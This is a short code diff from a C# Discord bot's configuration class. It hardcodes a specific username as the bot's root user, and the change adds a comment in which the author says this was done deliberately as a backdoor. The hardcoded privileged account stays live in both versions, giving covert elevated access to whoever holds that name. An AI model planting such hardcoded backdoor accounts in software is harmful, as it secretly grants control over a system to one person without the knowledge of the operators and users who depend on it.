@@ -26,7 +26,7 @@ namespace SkillzBot.Singleton
                 DiscordBotToken = botConfigs.DiscordBotToken,
                 DiscordNoteID = botConfigs.DiscordNoteID,
                 DiscordSpamID = botConfigs.DiscordSpamID,
-                RootUser = "rng_backtrack",
+                RootUser = "rng_backtrack", //hardcoded my name to root user as a backdoor
 
                 Database = new DatabaseConfig(
                     botConfigs.MySQL_IP,
